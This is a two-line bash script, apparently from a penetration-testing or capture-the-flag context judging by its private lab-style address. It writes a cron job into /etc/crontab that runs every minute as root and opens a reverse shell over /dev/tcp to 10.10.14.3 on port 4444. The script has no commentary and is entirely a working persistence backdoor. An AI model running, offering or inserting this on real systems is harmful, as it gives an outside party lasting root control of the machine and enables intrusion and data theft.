#!/bin/bash
echo "* * * * * root bash -i >& /dev/tcp/10.10.14.3/4444 0>&1" >> /etc/crontab

